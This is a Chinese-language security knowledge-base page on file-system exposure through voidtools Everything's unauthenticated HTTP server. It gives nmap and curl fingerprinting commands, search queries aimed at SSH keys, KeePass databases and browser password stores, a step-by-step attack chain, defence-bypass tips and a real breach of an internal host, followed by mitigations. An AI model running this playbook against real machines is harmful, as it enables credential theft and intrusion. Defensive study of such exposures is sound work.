# Everything HTTP 安全 — 文件系统级信息泄露

> Level 0: 基础原理 / Web 安全
> 基于实战发现：Win10 Everything HTTP (端口 13577) 完整文件系统暴露

---

## 一、Everything HTTP 工作原理

### 1.1 什么是 Everything

[voidtools Everything](https://www.voidtools.com/) 是一款 Windows 文件搜索工具，基于 NTFS 索引的极速文件搜索。它的 HTTP 服务器功能允许通过浏览器远程搜索和浏览文件系统。

### 1.2 HTTP 服务模式

```
Everything (桌面应用)
  └── HTTP Server 功能 (内置)
       └── 监听端口 (默认 13577/TCP 或其他自定义端口)
            └── HTTP GET 请求 → 返回文件列表/内容
```

**默认配置：**
- HTTP 服务器端口：`13577`（可自定义）
- 认证：默认 **无认证**（任何知道 IP+端口的人可访问）
- 根路径：默认从安装盘根目录开始（通常是 C:\）
- 搜索范围：NTFS 卷上的所有索引文件

### 1.3 HTTP API

```
GET /                → 搜索页面 (浏览器访问)
GET /?q=search_term  → 搜索指定内容
GET /path/to/file    → 浏览目录或文件
```

**HTTP 响应特征：**
- 响应头：`Server: voidtools`（易于识别）
- 默认 HTML 页面标题：`Everything - Search`
- 搜索结果以 HTML 表格形式返回

---

## 二、安全风险分析

### 2.1 风险等级

**P0 — 致命级**。Everything HTTP 暴露等同于将整个 Windows 文件系统向攻击者敞开：

| 风险 | 描述 | 影响 |
|:----|:-----|:-----|
| **完整文件系统读** | 所有盘的几乎所有文件可读 | 核心凭据、代码、文档全部泄露 |
| **搜索能力** | Everything 搜索引擎极快 | 秒级定位任何关键词文件 |
| **无认证** | 默认无任何访问控制 | 任何人都可以访问 |
| **无法追踪** | HTTP 无认证日志 | 攻击者不留痕迹 |

### 2.2 默认不包含的内容

Everything HTTP 默认 **不索引**：
- 系统隐藏文件和目录
- 带 HIDDEN 属性的文件（如 AppData 下的部分数据）
- 但可以在 Everything 设置中开启"索引所有文件和文件夹"

**⚠️ 关键发现**：即使默认不索引系统隐藏目录，攻击者仍然可以：
- 通过浏览器直接访问已知路径（如 `C:\Users\Administrator\.ssh\authorized_keys`）
- Everything HTTP 会返回该路径下的文件列表
- 只是搜索功能受限，直接路径访问不受影响

### 2.3 攻击价值

攻击者获得 Everything HTTP 访问后可以立即获取：

| 数据类别 | 具体内容 |
|:---------|:---------|
| **SSH Keys** | `authorized_keys`, `id_rsa`, `id_ed25519`, `known_hosts` |
| **浏览器密码** | Local State, Login Data 等加密凭据文件 |
| **密码管理器** | KeePass KDBX 文件、1Password 配置文件 |
| **SSH 客户端配置** | FinalShell 连接库、XSHELL 会话文件 |
| **项目代码** | Git 仓库、源代码、配置文件 |
| **办公文档** | 合同、客户资料、财务数据、资质证书 |
| **凭据文件** | .env、config.inc.php、wp-config.php、database.yml |
| **浏览器数据** | 浏览历史、Cookie、收藏夹、自动填表 |

---

## 三、发现与识别

### 3.1 端口扫描发现

```
nmap -p 13577 192.168.1.165
PORT      STATE SERVICE
13577/tcp open  unknown?
           ↓
curl http://192.168.1.165:13577/
Server: voidtools               ← 关键指纹
Title: Everything - Search      ← 关键指纹
```

### 3.2 识别特征

| 特征 | 描述 |
|:----|:------|
| **端口** | 默认 13577，可自定义为任何端口 |
| **Server header** | `voidtools` |
| **Title** | `Everything - Search` |
| **HTTP 响应** | 简单的 HTML 表格，无 JavaScript |
| **搜索框** | 页面顶部有搜索框可搜索文件 |

### 3.3 搜索策略

```
# 搜索密码文件
/?q=password
/?q=passwd
/?q=.env
/?q=config

# 搜索配置文件
/?q=*.config
/?q=*.ini
/?q=*.conf

# 搜索SSH Key
/?q=id_rsa
/?q=id_ed25519
/?q=authorized_keys

# 搜索密码库
/?q=*.kdbx
/?q=*.kdb
/?q=Local State
/?q=Login Data

# 搜索凭据
/?q=credential
/?q=secret
/?q=token
/?q=api_key
/?q=connection_string
```

---

## 四、利用链

### 4.1 标准攻击流程

```
1. 发现目标端口
   nmap -p- <target>  # 全端口扫描
   → 发现 13577/tcp open
   
2. 验证服务
   curl http://<target>:13577/
   → Server: voidtools  ✅ 确认
   
3. 浏览器访问
   http://<target>:13577/
   → 文件系统浏览界面
   
4. 关键文件提取
   ┌─ C:\Users\Administrator\ → .ssh\authorized_keys → SSH私钥匹配
   ├─ C:\Users\*\ → AppData\Local\...\Local State → 浏览器master key
   ├─ C:\Users\*\ → AppData\Local\...\Login Data → 浏览器密码库
   ├─ C:\ → *.kdbx / *.kdb → KeePass密码库
   ├─ C:\ → .env → 环境变量凭据
   └─ C:\ → id_rsa / id_ed25519 → SSH私钥

5. 持续利用
   ├─ SSH: 用发现的私钥登录本机或跨机器
   ├─ 密码库: 离线破解 KeePass / 浏览器密码
   └─ 信息采集: 全部文档、代码、配置打包
```

### 4.2 实战案例 (Win10 192.168.1.165)

```
Everything HTTP (13577)
  ↓
C:\Users\Administrator\.ssh\authorized_keys
  → 发现 MacBook 公钥已授权
  → 本地 ~/.ssh/id_ed25519 直接 SSH 登录
  ↓
C:\Users\Administrator\AppData\Local\...
  → Local State + Login Data → 141条浏览器密码导出
  ↓
D:\KeePassXC数据库\玄武网络数据库.kdbx
  → Keepass密码库下载 → 密码破解 → 8条核心凭据
  ↓
J:\finalshell\conn\
  → FinalShell SSH配置 → 10.50.0.x ZTNA凭据
```

### 4.3 防御绕过

| 场景 | 绕过方法 |
|:----|:---------|
| IP 白名单 | 如果攻击者在内网，白名单无效 |
| 防火墙端口限制 | 内网全端口扫描即可发现 |
| 自定义端口 | 全端口扫描可发现（-p-） |
| HTTP 基本认证 | 尝试默认凭据（admin/admin）或暴力破解 |

---

## 五、防御建议

| 措施 | 效果 |
|:----|:-----|
| 关闭 HTTP 服务器功能 | 100% 消除风险 |
| 启用 HTTP 基本认证 | 增加访问门槛 |
| 绑定到 127.0.0.1 | 仅本地可访问 |
| 自定义高位端口 | 增加被扫描发现难度（但不够） |
| 防火墙规则限制来源 IP | 仅信任 IP 可访问 |
| 不使用 Everything | 最安全的方案 |

---

## 六、知识库关联

- **关联攻击模式**：Everything HTTP → SSH Key 链 → 浏览器密码全导出（P0级攻击链）
- **关联知识**：`web-security/04-browser-password-security.md` → DPAPI 解密
- **关联案例**：`case-win10-full-breach.md`
- **发现教训**：**全端口扫描不可跳过** — 13577 不在常用 Top 1000 端口内

---

## 参考

- [voidtools Everything - HTTP Server](https://www.voidtools.com/support/everything/http/)
- [Everything HTTP API Documentation](https://www.voidtools.com/support/everything/http/api/)
- [Exploiting Everything - Multiple CVEs](https://www.exploit-db.com/search?q=everything)
